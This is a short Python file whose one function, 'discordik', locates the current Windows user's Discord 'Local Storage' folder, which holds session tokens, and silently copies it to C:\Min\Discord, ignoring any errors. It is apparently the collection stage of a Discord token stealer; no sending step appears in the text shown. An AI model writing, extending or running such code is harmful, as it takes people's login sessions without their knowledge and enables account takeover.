import os
import shutil
import getpass


def discordik():
    current_user = getpass.getuser()
    source_folder = f'C:\\Users\\{current_user}\\AppData\\Roaming\\discord\\Local Storage'
    destination_folder = r'C:\Min\Discord'
    if os.path.exists(source_folder):
        try:
            shutil.copytree(source_folder, destination_folder)
        except:
            pass
